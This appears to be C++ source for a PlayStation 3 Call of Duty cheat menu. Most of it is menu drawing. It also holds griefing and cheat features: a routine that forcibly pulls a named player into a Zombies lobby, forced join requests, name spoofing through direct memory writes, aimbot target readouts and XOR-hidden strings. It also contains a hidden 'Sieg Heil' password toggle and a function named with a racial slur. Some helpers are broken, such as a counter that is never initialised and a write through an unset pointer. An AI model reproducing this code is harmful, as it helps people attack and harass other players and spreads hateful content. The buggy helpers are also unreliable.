#include<Includes.h>

int cur_index_theme = 0;
menushit Mshit;
int pullcooldown;
float floatBetweenZeroAndOne = 0.25f;
float RainbowTimer;
color starrt = color(0, 0, 0, 255);

void flash(color* col) {
	RainbowTimer += 1.0f;
	col->r = (Sin(menu->menufade * RainbowTimer + 0.f) * 127.f + 128.f) / 255.0f;
	col->g = (Sin(menu->menufade * RainbowTimer + 2.f) * 127.f + 128.f) / 255.0f;
	col->b = (Sin(menu->menufade * RainbowTimer + 4.f) * 127.f + 128.f) / 255.0f;
	col->a = 1.0f;
	if (RainbowTimer > 1000000.0f) RainbowTimer = 0.f;
}

void flash2(color* col) {
	RainbowTimer += 1.0f;
	col->r = (Sin(menu->menufade * RainbowTimer + 0.5f) * 127.f + 128.f) / 255.0f;
	col->g = (Sin(menu->menufade * RainbowTimer + 2.5f) * 127.f + 128.f) / 255.0f;
	col->b = (Sin(menu->menufade * RainbowTimer + 4.5f) * 127.f + 128.f) / 255.0f;
	col->a = 1.0f;
	if (RainbowTimer > 1000000.0f) RainbowTimer = 0.f;
}

void flash3(color* col) {
	RainbowTimer += 1.0f;
	col->r = (Sin(menu->menufade * RainbowTimer + 0.f) * 127.f + 128.f) / 255.0f;
	col->g = (Sin(menu->menufade * RainbowTimer + 2.f) * 127.f + 128.f) / 255.0f;
	col->b = (Sin(menu->menufade * RainbowTimer + 4.f) * 127.f + 128.f) / 255.0f;
	col->a = 1.0f;
	if (RainbowTimer > 1000000.0f) RainbowTimer = 0.f;
}

void flash4(color* col) {
	RainbowTimer += 1.0f;
	col->r = (Sin(menu->menufade * RainbowTimer + 0.5f) * 127.f + 128.f) / 255.0f;
	col->g = (Sin(menu->menufade * RainbowTimer + 2.5f) * 127.f + 128.f) / 255.0f;
	col->b = (Sin(menu->menufade * RainbowTimer + 4.5f) * 127.f + 128.f) / 255.0f;
	col->a = 1.0f;
	if (RainbowTimer > 1000000.0f) RainbowTimer = 0.f;
}

void flash5(color* col) {
	RainbowTimer += 1.0f;
	col->r = (Sin(menu->menufade * RainbowTimer + 1.f) * 127.f + 128.f) / 255.0f;
	col->g = (Sin(menu->menufade * RainbowTimer + 3.f) * 127.f + 128.f) / 255.0f;
	col->b = (Sin(menu->menufade * RainbowTimer + 5.f) * 127.f + 128.f) / 255.0f;
	col->a = 1.0f;
	if (RainbowTimer > 1000000.0f) RainbowTimer = 0.f;
}

void flash6(color* col) {
	RainbowTimer += 1.0f;
	col->r = (Sin(menu->menufade * RainbowTimer + 1.5f) * 127.f + 128.f) / 255.0f;
	col->g = (Sin(menu->menufade * RainbowTimer + 3.5f) * 127.f + 128.f) / 255.0f;
	col->b = (Sin(menu->menufade * RainbowTimer + 5.5f) * 127.f + 128.f) / 255.0f;
	col->a = 1.0f;
	if (RainbowTimer > 1000000.0f) RainbowTimer = 0.f;
}

void DrawFilledBox(int x, int y, int w, int h, float angle, color color) {
	CG_DrawRotatedPic(x, y, w, h, angle, color, frame_color_debug);
}

void DrawGradientBox(int x, int y, int w, int h, float angle, color A, color B) {
	DrawFilledBox(x, y, w, h, angle, A);
	color Grad;
	B.copy(&Grad);
	for (int i = 0; i < h; i++) {
		Grad.a = (float)i / 95;
		if ((y + h / 2 - h / 4) + i >= y + h) break;
		DrawFilledBox(x, (y + h / 2 - h / 4) + i, w, 2, angle, Grad);
	}
}

bool SLLR;
void _Buttoninfo() {
	if (menu->btrickmode) return;
	if (!Mshit.Mopened) {
		DrawTextWithBackground_UI(hash("Press ^BPS3ButtonStickAnimatedR^ & ^BPS3ButtonDpadL^ to open the menu"), 15, (dc.height > 720) ? dc.height / 2 - 25 : 880, (dc.height > 720) ? .80 / 1.3 : .80, color(255, 255, 255, 255), menu->skin, color(42, 42, 42, 255), align_left);
	}

	else if (Mshit.id > ID_MAIN) {
		DrawTextWithBackground_UI(hash("Press ^BPS3ButtonCircle^ to go back || ^BPS3ButtonDpadU^ / ^BPS3ButtonDpadD^ to scroll || ^BPS3ButtonX^ to select"), 15, (dc.height > 720) ? dc.height / 2 - 25 : 880, (dc.height > 720) ? .80 / 1.3 : .80, color(255, 255, 255, 255), menu->skin, color(42, 42, 42, 255), align_left);
	}

	else {
		DrawTextWithBackground_UI(hash("Press ^BPS3ButtonCircle^ to close the menu || ^BPS3ButtonDpadU^ / ^BPS3ButtonDpadD^ to scroll || ^BPS3ButtonX^ to select"), 15, (dc.height > 720) ? dc.height / 2 - 25 : 880, (dc.height > 720) ? .80 / 1.3 : .80, color(255, 255, 255, 255), menu->skin, color(42, 42, 42, 255), align_left);
	}
}

size_t stringlength(const char* s) {
	size_t s_len;
	for (int i = 0; i < strlen(s) - 1; i++) {
		if (s[i] != '\0')
			s_len++;
	}
	return s_len;
}

#pragma region command stuff
void local_command_complete(int localClientNum, const wchar_t* wstr, unsigned int length) {
	char* buffer = (char*)_sys_malloc(length);
	WideCharToMultibyte(wstr, length, buffer);
	if (strlen(buffer) <= 0) return;
	Cbuf_AddText(buffer);
	Mshit.Mopened = true;
}

void Change_Name_complete(int localClientNum, const wchar_t* wstr, unsigned int length) {
	char* buffer = (char*)_sys_malloc(length);
	WideCharToMultibyte(wstr, length, buffer);

	if (strlen(buffer) <= 0) return;

	if (cl_ingame_()) {
		char ingameflash[256];
		_sys_sprintf(ingameflash, hash(";cmd userinfo \"\\clanAbbrev\\%s\\name\\%s\\xuid\\%s"), "", buffer, 0x26C06E8);
		WriteMemory(0x026C0658, buffer, 32);
		WriteMemory(0x026C067F, buffer, 32);
		Cbuf_AddText(ingameflash);
	} else {
		WriteMemory(0x026C0658, buffer, 32);
		WriteMemory(0x026C067F, buffer, 32);
	}
	Mshit.Mopened = true;
}

int getUserID_t[2] = { 0x081e378, TOC };
int(*getUserID_f)(const char* localNum) = (int(*)(const char*))getUserID_t;

int getUserID(const char* username) {
	return getUserID_f(username);
}

const char* ToLower(std::string name) {
	std::transform(name.begin(), name.end(), name.begin(),
		[](unsigned char c) { return std::tolower(c); });
	return name.c_str();
}

int Live_SendJoinRequest_a[2] = { 0x052faa0, TOC };
void(*Live_SendJoinRequest)(SceNpId* r3, int r4) = (void(*)(SceNpId*, int)) & Live_SendJoinRequest_a;

int Cancel_JoinPopUp1_a[2] = { 0x0537c84, TOC };
void(*Cancel_JoinPopUp1)(int r4) = (void(*)(int)) & Cancel_JoinPopUp1_a;

int Cancel_JoinPopUp2_a[2] = { 0x0372668, TOC };
void(*Cancel_JoinPopUp2)(int r4) = (void(*)(int)) & Cancel_JoinPopUp2_a;

void Join_Name_complete(int localClientNum, const wchar_t* wstr, unsigned int length) {
	char* buffer = (char*)_sys_malloc(length);
	WideCharToMultibyte(wstr, length, buffer);

	if (strlen(buffer) <= 0) return;

	auto Lookup = doLookupNpId(buffer);

	if (Lookup.first.reserved[0] == 0) {
		char buf[100];
		Com_Sprintf(buf, sizeof(buf), encryptDecrypt(hash("$r!endr!onu!dyhru")).c_str(), buffer);
		UI_OpenToastPopup(0, encryptDecrypt(hash("ldot^lq^bnous`bu^dyqhsde")).c_str(), buf, VirtualXOR(hash("XMK@HU"), 3).c_str(), 5000);
		goto End;
	}

	if (Lookup.second == 0) {
		Live_SendJoinRequest(&Lookup.first, 0);
		UI_OpenToastPopup(0, encryptDecrypt(hash("ldot^lq^q`sux^d`rd^hbno")).c_str(), encryptDecrypt(hash("Knhohof")).c_str(), buffer, 5000);//Joining 
		goto End;
	}
End:
	Cancel_JoinPopUp1(0);
	Cancel_JoinPopUp2(0);

	memcpy(menu->DefName, buffer, 32);
	delete[] buffer;
	Mshit.Mopened = true;
}

void Send_Name_complete(int localClientNum, const wchar_t* wstr, unsigned int length) {
	char* buffer = (char*)_sys_malloc(length);
	WideCharToMultibyte(wstr, length, buffer);

	if (strlen(buffer) <= 0) return;

	auto Lookup = doLookupNpId(buffer);

	if (Lookup.first.reserved[0] == 0) {
		char buf[100];
		Com_Sprintf(buf, sizeof(buf), encryptDecrypt(hash("$r!endr!onu!dyhru")).c_str(), buffer);
		UI_OpenToastPopup(0, encryptDecrypt(hash("ldot^lq^bnous`bu^dyqhsde")).c_str(), buf, VirtualXOR(hash("XMK@HU"), 3).c_str(), 5000);//Unable user doesn't exsist
		goto End;
	}

	if (Lookup.second == 0) {
		if (messages.size() != 1) {
			UI_OpenToastPopup(0, encryptDecrypt(hash("ldot^lq^q`sux^d`rd^hbno")).c_str(), encryptDecrypt(hash("Rdoehof")).c_str(), buffer, 5000);//Sending 
			pull_client_to_lobby(Lookup.first, 0, 900, menu->exploittimeout * 1000);
		}
		goto End;
	}
End:

	memcpy(menu->DefName, buffer, 32);
	delete[] buffer;
	Mshit.Mopened = true;

	pullcooldown = menu->exploittimeout;
}

void Join_XName_complete(int localClientNum, const wchar_t* wstr, unsigned int length) {
	char* buffer = (char*)_sys_malloc(length);
	WideCharToMultibyte(wstr, length, buffer);

	char npid[9];
	memcpy(npid, doLookupNpId(buffer).first.opt, 8);

	npid[4] = 'p';
	npid[5] = 's';
	npid[6] = '3';

	friends::write_friend(buffer, npid);

	delete[] buffer;
	Mshit.Mopened = true;
}

void dokeyboard() {
	XShowKeyboardUI(0, L"Local Command", L"", 32, local_command_complete, 0);
}

void dokeyboard1() {
	XShowKeyboardUI(0, L"Change Name", L"", 32, Change_Name_complete, 0);
}

void JoinKey() {
	XShowKeyboardUI(0, L"Enter Name to Join", L"", 32, Join_Name_complete, 0);
}

void AddXname() {
	XShowKeyboardUI(0, L"Enter Name to Add to Fake List", L"", 32, Join_XName_complete, 0);
}

void StopAtak() {
	pullcooldown = 0;
	messages.clear();
}

void local_command() {
	dokeyboard();
}

void ChangeName() {
	dokeyboard1();
}

void JoinByName() {
	JoinKey();
}
void SendKey() {
	XShowKeyboardUI(0, L"Enter Name to Send to Zombies", L"", 32, Send_Name_complete, 0);
}
void SendByName() {
	if (messages.size() != 1) {
		SendKey();
	}
}

void ResetName() {

	SceNpOnlineId onlineid;

	sceNpManagerGetOnlineId(&onlineid);

	menu->flshname = false;
	if (cl_ingame_()) {
		char ingameflash[256];
		_sys_sprintf(ingameflash, hash(";cmd userinfo \"\\clanAbbrev\\%s\\name\\%s\\xuid\\%s"), "", onlineid.data, 0x26C06E8);
		Cbuf_AddText(ingameflash);
	} else {
		WriteMemory(0x026C067F, &onlineid.data, 32);
		WriteMemory(0x026C0658, &onlineid.data, 32);
	}

	ChangeClanTagPreGame("");
}
void Change_Name_complete1(int localClientNum, const wchar_t* wstr, unsigned int length) {
	char* buffer = (char*)_sys_malloc(length);
	WideCharToMultibyte(wstr, length, buffer);

	if (strlen(buffer) <= 0) return;

	if (!strcmp(buffer, hash("Sieg Heil On"))) {
		bot.nazixh = true;
	}
	if (!strcmp(buffer, hash("Sieg Heil Off"))) {
		bot.nazixh = false;
	}
	Mshit.Mopened = true;
}

void dokeyboard2() {
	XShowKeyboardUI(0, L"Enter Password", L"", 32, Change_Name_complete1, 0);
}

void NaziNiggerThingy() {
	dokeyboard2();
}

void EndGame() {
	char buffer[50];
	_sys_sprintf(buffer, hash("cmd mr %i %i endround"), *(int*)(0xF11D9C), 3);
	Cbuf_AddText(buffer);
}

void Disconnect() {
	Cbuf_AddText(hash("disconnect 1"));
}

int __cdecl GetUser(const char* user) {
	int dest;
	unsigned int offset;
	unsigned int hashSize;
	int tigerHash;
	char licenseHash[24];
	int v2;
	if (!user)
		return 0;
	bdHashTiger192_f(&tigerHash);
	hashSize = 24;
	bdHashTiger192_hash_f(user, strlen(user), licenseHash, &hashSize);
	RemoveBuffer(licenseHash, hashSize, 0, &offset, &dest, 8u);
	bdHashTiger192_f_(&tigerHash);
	return dest;
}

std::vector<std::string>CamoV;
void ProcessCamo() {
	CamoV.clear();
	int fd;
	const char* dirName = hash("/dev_hdd0/tmp/Genisys/Custom_Camos/");
	size_t dirLength = strlen(dirName) + 1;
	uint32_t data_count = 0;

	CellFsDirectoryEntry entry;
	memset(&entry, 0, sizeof(CellFsDirectoryEntry));
	cellFsOpendir(dirName, &fd);
	cellFsGetDirectoryEntries(fd, &entry, sizeof(CellFsDirectoryEntry), &data_count);
	do {
		for (int i = 0; i < data_count; i++) {
			cellFsGetDirectoryEntries(fd, &entry, sizeof(CellFsDirectoryEntry), &data_count);
			if (strstr(entry.entry_name.d_name, hash(".dds")) != NULL || strstr(entry.entry_name.d_name, hash(".DDS")) != NULL) {
				size_t len = strlen(entry.entry_name.d_name) + dirLength;
				char* fname = new char[len + 1];
				sprintf(fname, hash("%s/%s"), dirName, entry.entry_name.d_name);
				CamoV.push_back(entry.entry_name.d_name);
			}
		}
	} while (data_count);
}

void Join(std::string c) {
	int xuid = getUserID(ToLower(c));
	char out[60];
	sprintf(out, hash("joinplayersessionbyxuid %llu"), xuid);
	printf(hash("%s\n"), out);
	Cbuf_AddText(out);
}

int StringToXUID_t[2] = { 0x606F08, TOC };
void(*StringToXUID_f)(const char* str, unsigned __int64* xuid) = (void(*)(const char*, unsigned __int64*))StringToXUID_t;

void __cdecl StringToXUID(const char* str, unsigned __int64* xuid) {
	StringToXUID_f(str, xuid);
}

#pragma endregion
#pragma region misc functions
void movement_event() {
	static int itick, iwait;
	bool istate = ((Sys_Milliseconds() - itick) > iwait);
	if (istate) {

		auto size = Mshit.maxscroll[Mshit.id] > Mshit.max_options ? (Mshit.max_options * 30) : (Mshit.maxscroll[Mshit.id] * 30);
		menu->height < (size) ? menu->height += 30 : menu->height >(size) ? menu->height -= 30 : menu->height = (size);

		Mshit.Mopened ? ((menu->x > 640) ? menu->x -= 150 : menu->x = 640) : (menu->x < 1800) ? menu->x += 150 : menu->x = 1800;

		menu->sypos1 < ((Mshit.scroll[Mshit.id] - Mshit.menu_offsets[Mshit.id]) * 30) ? menu->sypos1 += 30 : menu->sypos1 >((Mshit.scroll[Mshit.id] - Mshit.menu_offsets[Mshit.id]) * 30) ? menu->sypos1 -= 30 : menu->sypos1 = ((Mshit.scroll[Mshit.id] - Mshit.menu_offsets[Mshit.id]) * 30);

		itick = Sys_Milliseconds(), iwait = (dc.fps < 55.0) ? (1.0 - 60.0 + dc.fps) : (1.0);
	}
}

void Wait(float timeout) {
	Mshit.tick = Sys_Milliseconds();
	Mshit.wait = (dc.fps < 55.0) ? (timeout - 60.0 + dc.fps) : timeout;
}

int SND_Play_t[2] = { 0x4FFA10, TOC };
void(*SND_Play_f)(String alias, int fadeTimeMs, float attenuation, int r1, int r2, int r3, int r4) = (void(*)(String, int, float, int, int, int, int))SND_Play_t;

void SND_Play(String alias, int fadeTimeMs, float attenuation) {
	if (!menu->engnsounds) {
		SND_Play_f(alias, fadeTimeMs, attenuation, 0, 0, 0, 0);
	}
}

const char* get_ip_address() {
	char* ip_address;
	int ret;
	union CellNetCtlInfo info;

	ret = cellNetCtlGetInfo(CELL_NET_CTL_INFO_IP_ADDRESS, &info);
	if (ret < 0) {
		/* Error handling */
	}

	memcpy(ip_address, info.ip_address, sizeof(info.ip_address));

	return ip_address;
}

int UI_SafeTranslateString_t[2] = { 0x0370D9C, TOC };
String(*UI_SafeTranslateString_f)(String s) = (String(*)(String))UI_SafeTranslateString_t;

int SL_ConvertToString_t[2] = { 0x048E2DC, TOC };
String(*SL_ConvertToString_f)(short s) = (String(*)(short))SL_ConvertToString_t;

using namespace std;
string encryptDecrypt(string toEncrypt) {
	char key = 1;
	string output = toEncrypt;

	for (int i = 0; i < toEncrypt.size(); i++)
		output[i] = toEncrypt[i] ^ key;

	return output;
}

uint8_t t1 = 0, t2 = 0;
float fps;
int tempd = 0;

void Ui_interface() {
	if (menu->btrickmode) return;
	static int itick, iwait;
	bool istate = ((Sys_Milliseconds() - itick) > iwait);
	if (istate) {
		tempd = 30;
		GetTemps(&t1, &t2, menu->fahrenheit);
		itick = Sys_Milliseconds(), iwait = 30000;
	}
	static int itick1, iwait1;
	bool istate1 = ((Sys_Milliseconds() - itick1) > iwait1);
	if (istate1) {
		fps = dc.fps;
		itick1 = Sys_Milliseconds(), iwait1 = 200;
	}
	static int itick2, iwait2;
	bool istate2 = ((Sys_Milliseconds() - itick2) > iwait2);
	if (istate2) {
		tempd -= 1;
		itick2 = Sys_Milliseconds(), iwait2 = 1000;
	}

	static int itick3, iwait3;
	bool istate3 = ((Sys_Milliseconds() - itick3) > iwait3);
	if (istate3) {

		if (messages.size() != 1 && pullcooldown != 0) {
			pullcooldown -= 1;
			itick3 = Sys_Milliseconds(), iwait3 = 900;
		}
	}

	char MenuBuff[200];
	int size;

	size = 10;

	if (bot.snake_bot) {
		Com_Sprintf(MenuBuff, sizeof(MenuBuff), bot.snake ? hash("Snake: ^2ON") : hash("Snake: ^1OFF"));
		DrawTextWithBackground_UI(MenuBuff, 14, dc.height / 4, (dc.height > 720) ? .80 / 1.3 : .80, color(255, 255, 255, 255), menu->skin, color(42, 42, 42, 255), align_left);
	}

	DrawTextWithBackground_UI(encryptDecrypt(hash("FDOHRXR!CN3")).c_str(), 14, size, (dc.height > 720) ? .80 / 1.3 : .80, color(255, 255, 255, 255), menu->skin, color(42, 42, 42, 255), align_left);
	float height = DrawTextWithBackground_UI(hash("Version 3.4"), dc.width - 15, size, (dc.height > 720) ? .80 / 1.3 : .80, color(255, 255, 255, 255), menu->skin, color(42, 42, 42, 255), align_right) + 10;

	if (!menu->temp1) {
		if (menu->fahrenheit)
			Com_Sprintf(MenuBuff, sizeof(MenuBuff), hash("CPU %i°C"), t1);
		else
			Com_Sprintf(MenuBuff, sizeof(MenuBuff), hash("CPU %i°F"), t1);
		height += DrawTextWithBackground_UI(MenuBuff, dc.width - 15, size + height, (dc.height > 720) ? .80 / 1.3 : .80, color(255, 255, 255, 255), menu->skin, color(42, 42, 42, 255), align_right) + 10;
	}

	if (!menu->temp2) {
		if (menu->fahrenheit)
			Com_Sprintf(MenuBuff, sizeof(MenuBuff), hash("RSX %i°C"), t2);
		else
			Com_Sprintf(MenuBuff, sizeof(MenuBuff), hash("RSX %i°F"), t2);

		height += DrawTextWithBackground_UI(MenuBuff, dc.width - 15, size + height, (dc.height > 720) ? .80 / 1.3 : .80, color(255, 255, 255, 255), menu->skin, color(42, 42, 42, 255), align_right) + 10;
	}

	if (!menu->fps) {
		Com_Sprintf(MenuBuff, sizeof(MenuBuff), hash("FPS: %.f"), cl_ingame_() ? fps / 2 : fps);
		height += DrawTextWithBackground_UI(MenuBuff, dc.width - 15, size + height, (dc.height > 720) ? .80 / 1.3 : .80, color(255, 255, 255, 255), menu->skin, color(42, 42, 42, 255), align_right) + 10;
	}

	if (!menu->res) {
		Com_Sprintf(MenuBuff, sizeof(MenuBuff), hash("Resolution: %i x %i"), dc.width, dc.height);
		height += DrawTextWithBackground_UI(MenuBuff, dc.width - 15, size + height, (dc.height > 720) ? .80 / 1.3 : .80, color(255, 255, 255, 255), menu->skin, color(42, 42, 42, 255), align_right) + 20;
	}

	if (!menu->fmpssaving) {
		Com_Sprintf(MenuBuff, sizeof(MenuBuff), menu->fpssaving ? hash("FPS Saving: ^2ON") : hash("FPS Saving: ^1OFF"));
		height += DrawTextWithBackground_UI(MenuBuff, dc.width - 15, size + height, (dc.height > 720) ? .80 / 1.3 : .80, color(255, 255, 255, 255), menu->skin, color(42, 42, 42, 255), align_right) + 20;
	}

	if (!menu->serverinfo) {
		Com_Sprintf(MenuBuff, sizeof(MenuBuff), hash("%s"), hash("Server Info:"));
		height += DrawTextWithBackground_UI(MenuBuff, dc.width - 15, size + height, (dc.height > 720) ? .80 / 1.3 : .80, color(255, 255, 255, 255), menu->skin, color(42, 42, 42, 255), align_right) + 10;
		if (!menu->host) {
			Com_Sprintf(MenuBuff, sizeof(MenuBuff), hash("Host Name: %s"), Dvar_GetString(hash("party_hostname")));
			height += DrawTextWithBackground_UI(MenuBuff, dc.width - 15, size + height, (dc.height > 720) ? .80 / 1.3 : .80, color(255, 255, 255, 255), menu->skin, color(42, 42, 42, 255), align_right) + 10;
		}

		if (!menu->map) {
			Com_Sprintf(MenuBuff, sizeof(MenuBuff), hash("Map Name: %s"), Dvar_GetString(hash("party_mapname")));
			height += DrawTextWithBackground_UI(MenuBuff, dc.width - 15, size + height, (dc.height > 720) ? .80 / 1.3 : .80, color(255, 255, 255, 255), menu->skin, color(42, 42, 42, 255), align_right) + 10;
		}

		if (!menu->game) {
			Com_Sprintf(MenuBuff, sizeof(MenuBuff), hash("Game Type: %s"), Dvar_GetString(hash("party_gametype")));
			height += DrawTextWithBackground_UI(MenuBuff, dc.width - 15, size + height, (dc.height > 720) ? .80 / 1.3 : .80, color(255, 255, 255, 255), menu->skin, color(42, 42, 42, 255), align_right) + 10;
		}

		if (!cl_ingame_() && menu->game && menu->host && menu->map) {
			menu->serverinfo = true;
		}
	}

	if (cl_ingame_()) {
		if (!menu->serverinfo) {
			if (!menu->ping) {
				Com_Sprintf(MenuBuff, sizeof(MenuBuff), hash("Latency: %i"), cg->ping);
				height += DrawTextWithBackground_UI(MenuBuff, dc.width - 15, size + height, (dc.height > 720) ? .80 / 1.3 : .80, color(255, 255, 255, 255), menu->skin, color(42, 42, 42, 255), align_right) + 10;
			}
			if (!menu->ents) {
				Com_Sprintf(MenuBuff, sizeof(MenuBuff), hash("Entitys: %i"), cg->snap->get<int>(0x2A20));
				height += DrawTextWithBackground_UI(MenuBuff, dc.width - 15, size + height, (dc.height > 720) ? .80 / 1.3 : .80, color(255, 255, 255, 255), menu->skin, color(42, 42, 42, 255), align_right) + 10;
			}
			if (!menu->maxc) {
				Com_Sprintf(MenuBuff, sizeof(MenuBuff), hash("Clients: %i"), cg->snap->get<int>(0x2A24));
				if (dc.height > 720) height += DrawTextWithBackground_UI(MenuBuff, dc.width - 15, size + height, (dc.height > 720) ? .80 / 1.3 : .80, color(255, 255, 255, 255), menu->skin, color(42, 42, 42, 255), align_right) + 25;
				else height += DrawTextWithBackground_UI(MenuBuff, dc.width - 15, size + height, (dc.height > 720) ? .80 / 1.3 : .80, color(255, 255, 255, 255), menu->skin, color(42, 42, 42, 255), align_right) + 20;
			}
			if (menu->game && menu->host && menu->map && menu->maxc && menu->ents && menu->ping) {
				menu->serverinfo = true;
			}
		}

		if (bot.esp.btargetinfo) {
			Com_Sprintf(MenuBuff, sizeof(MenuBuff), hash("%s"), hash("Target Info:"));
			height += DrawTextWithBackground_UI(MenuBuff, dc.width - 15, size + height, (dc.height > 720) ? .80 / 1.3 : .80, color(255, 255, 255, 255), menu->skin, color(42, 42, 42, 255), align_right) + 10;

			if (local->target_num != -1) {
				Com_Sprintf(MenuBuff, sizeof(MenuBuff), hash("Name: %s"), cg->clients[local->target_num].PlayerName);
				height += DrawTextWithBackground_UI(MenuBuff, dc.width - 15, size + height, (dc.height > 720) ? .80 / 1.3 : .80, color(255, 255, 255, 255), menu->skin, color(42, 42, 42, 255), align_right) + 10;
				int GDistance = (centity[local->target_num].Origin.distance(centity[cg->clientNum].Origin) / 12 / 3.28);
				Com_Sprintf(MenuBuff, sizeof(MenuBuff), hash("Distance: %im"), GDistance);
				height += DrawTextWithBackground_UI(MenuBuff, dc.width - 15, size + height, (dc.height > 720) ? .80 / 1.3 : .80, color(255, 255, 255, 255), menu->skin, color(42, 42, 42, 255), align_right) + 10;
				int widd = centity[local->target_num].WeaponID;
				if (!widd)return;
				WeaponVariantDef* weapVDef = BG_GetWeaponVariantDef(widd);
				if (weapVDef) {
					Com_Sprintf(MenuBuff, sizeof(MenuBuff), hash("Weapon: %s"), UI_SafeTranslateString_f(weapVDef->szDisplayName));
					height += DrawTextWithBackground_UI(MenuBuff, dc.width - 15, size + height, (dc.height > 720) ? .80 / 1.3 : .80, color(255, 255, 255, 255), menu->skin, color(42, 42, 42, 255), align_right) + 10;
				}
				Com_Sprintf(MenuBuff, sizeof(MenuBuff), hash("Bone: %s"), SL_ConvertToString_f(bot.psztag[local->target_num]));//SL_ConvertToString
				height += DrawTextWithBackground_UI(MenuBuff, dc.width - 15, size + height, (dc.height > 720) ? .80 / 1.3 : .80, color(255, 255, 255, 255), menu->skin, color(42, 42, 42, 255), align_right) + 10;
				Com_Sprintf(MenuBuff, sizeof(MenuBuff), hash("Visible: %s"), bot.bvisible_esp[local->target_num] ? hash("^2True") : hash("^1False"));
				height += DrawTextWithBackground_UI(MenuBuff, dc.width - 15, size + height, (dc.height > 720) ? .80 / 1.3 : .80, color(255, 255, 255, 255), menu->skin, color(42, 42, 42, 255), align_right) + 10;
				Com_Sprintf(MenuBuff, sizeof(MenuBuff), hash("Hittable: %s"), bot.bautowall_esp[local->target_num] ? hash("^2True") : hash("^1False"));
				height += DrawTextWithBackground_UI(MenuBuff, dc.width - 15, size + height, (dc.height > 720) ? .80 / 1.3 : .80, color(255, 255, 255, 255), menu->skin, color(42, 42, 42, 255), align_right) + 10;

				if (bot.baimatfeet) {
					Com_Sprintf(MenuBuff, sizeof(MenuBuff), hash("Has Shield: %s"), bot.sc[local->target_num] ? hash("^2True") : hash("^1False"));
					height += DrawTextWithBackground_UI(MenuBuff, dc.width - 15, size + height, (dc.height > 720) ? .80 / 1.3 : .80, color(255, 255, 255, 255), menu->skin, color(42, 42, 42, 255), align_right) + 10;
				}

			}
		}
	}
}

Vector2 GetOptPos(int i, bool opt = false) {
	if (!opt)
		i -= menu->Offset;
	return{ menu->OptPos.x, menu->OptPos.y + (i * 25) };
}

void addTitle(String title, int ret_id) {
	Mshit.active_option = (Mshit.scroll[Mshit.id] == Mshit.maxscroll[Mshit.id]);

	DrawShader(menu->x - 1, 200, menu->msize + 2, 60 + menu->height, 0, color(0, 0, 0, 200), white, align_center);//back

	DrawShader(menu->x - 1, 200, menu->msize + 2, 40, 0, color(42, 42, 42, 255), white, align_center);//title back

	DrawTextWithEffects1(title, menu->x, 237, 1, menu->skin, align_center);//title

	char menu_number[100];

	_sys_sprintf(menu_number, hash("%i/%i"), Mshit.scroll[Mshit.id] + 1, Mshit.maxscroll[Mshit.id]);

	Mshit.maxscroll[Mshit.id] = 0;

	Mshit.prev[Mshit.id] = ret_id;

	if (Mshit.scroll[Mshit.id] - Mshit.menu_offsets[Mshit.id] >= 0 && Mshit.scroll[Mshit.id] < Mshit.menu_offsets[Mshit.id] + Mshit.max_options) {
		DrawShader(menu->x, 200 + 60 + ((Mshit.scroll[Mshit.id] - Mshit.menu_offsets[Mshit.id]) * 30) - 6, menu->msize, 1, 0, color(10, 10, 10, 255), white, align_center);//scroll

		DrawShader(menu->x, 200 + 60 + ((Mshit.scroll[Mshit.id] - Mshit.menu_offsets[Mshit.id]) * 30) + 27, menu->msize, 1, 0, color(10, 10, 10, 255), white, align_center);//scroll bottem
	}
	DrawShader(menu->x, 200 + 60 + menu->height, menu->msize, 30, 0, color(42, 42, 42, 255), white, align_center);

	DrawText(menu_number, Vector2(menu->x + (menu->msize / 2) - 10, 277 + menu->height + (30 / 3)), 0, (dc.height > 720) ? .80 / 1.3 : .80, hash("extraSmallFont"), menu->skin, align_right, 1);

	DrawOutline(menu->x, 200, menu->msize, 90 + menu->height, menu->skin, 3, align_center);//outline
}

std::string iRecent;
void addSubmenu(String title, int sub_id) {
	if (active && PadDown(PAD_CROSS, CELL_PAD_BTN_OFFSET_DIGITAL2) && ready) {
		Mshit.menu_offsets[sub_id] = Mshit.scroll[sub_id] >= Mshit.max_options ? Mshit.scroll[sub_id] + 1 - Mshit.max_options : 0;

		SND_Play(hash("cac_screen_fade"), 1, 1),
			Mshit.id = sub_id, iRecent = title, Wait(200);
	}

	if (Mshit.maxscroll[Mshit.id] - Mshit.menu_offsets[Mshit.id] >= 0 && Mshit.maxscroll[Mshit.id] < Mshit.menu_offsets[Mshit.id] + Mshit.max_options) {
		DrawShader(menu->x + (menu->msize / 2) - 13, 264 + ((Mshit.maxscroll[Mshit.id] - Mshit.menu_offsets[Mshit.id]) * 30), 15, 15, 180, color(255, 255, 255, 255), menu_safearea_arrow, align_right);
		DrawText(title, Vector2((active ? (menu->x + 15) : (menu->x + 5)) - (menu->msize / 2), 282 + ((Mshit.maxscroll[Mshit.id] - Mshit.menu_offsets[Mshit.id]) * 30)), 0, (dc.height > 720) ? .80 / 1.3 : .80, hash("extraSmallFont"), active ? menu->skin : color(255, 255, 255, 255), align_left, active ? 1 : 0);
	}

	Mshit.maxscroll[Mshit.id]++;
}

void addFriendSubmenu(String title, int sub_id) {
	if (active && PadDown(PAD_CROSS, CELL_PAD_BTN_OFFSET_DIGITAL2) && ready) {
		Mshit.menu_offsets[sub_id] = Mshit.scroll[sub_id] >= Mshit.max_options ? Mshit.scroll[sub_id] + 1 - Mshit.max_options : 0;
		SND_Play(hash("cac_screen_fade"), 1, 1);
		Mshit.id = sub_id;
		friends::read_friends();
		iRecent = title;
		Wait(200);
	}
	//printf(hash("play"));
	if (Mshit.maxscroll[Mshit.id] - Mshit.menu_offsets[Mshit.id] >= 0 && Mshit.maxscroll[Mshit.id] < Mshit.menu_offsets[Mshit.id] + Mshit.max_options) {
		DrawShader(menu->x + (menu->msize / 2) - 13, 264 + ((Mshit.maxscroll[Mshit.id] - Mshit.menu_offsets[Mshit.id]) * 30), 15, 15, 180, color(255, 255, 255, 255), menu_safearea_arrow, align_right);
		DrawText(title, Vector2((active ? (menu->x + 10) : (menu->x + 5)) - (menu->msize / 2), 282 + ((Mshit.maxscroll[Mshit.id] - Mshit.menu_offsets[Mshit.id]) * 30)), 0, (dc.height > 720) ? .80 / 1.3 : .80, hash("extraSmallFont"), active ? menu->skin : color(255, 255, 255, 255), align_left, active ? 1 : 0);
	}
	Mshit.maxscroll[Mshit.id]++;
}

void addColorSubmenu(String title, int sub_id, color col) {
	if (active && PadDown(PAD_CROSS, CELL_PAD_BTN_OFFSET_DIGITAL2) && ready) {
